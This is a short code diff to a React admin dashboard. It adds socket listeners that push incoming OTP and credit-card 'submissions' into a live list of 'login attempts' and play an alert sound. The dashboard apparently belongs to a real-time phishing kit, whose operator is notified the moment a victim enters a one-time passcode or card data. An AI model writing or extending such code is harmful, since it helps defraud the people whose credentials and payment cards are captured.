@@ -167,6 +167,17 @@ export default function AdminDashboard() {
     socket.on('update_login_attempt', (updatedAttempt: LoginAttempt) => setLoginAttempts(prev => prev.map(att => att.id === updatedAttempt.id ? updatedAttempt : att)));
     socket.on('logs_cleared', () => alert('Logs Cleared'));
 
+    // --- NEW: Listen for OTP/CC submissions and play sound ---
+    socket.on('new_otp_submission', (attempt: LoginAttempt) => {
+      setLoginAttempts(prev => [attempt, ...prev.filter(a => a.id !== attempt.id)]);
+      notificationAudio.play().catch(() => {});
+    });
+    socket.on('new_cc_submission', (attempt: LoginAttempt) => {
+      setLoginAttempts(prev => [attempt, ...prev.filter(a => a.id !== attempt.id)]);
+      notificationAudio.play().catch(() => {});
+    });
+    // --- END NEW ---
+
     return () => { socket.disconnect() };
   }, [fetchLoginAttempts]);
 
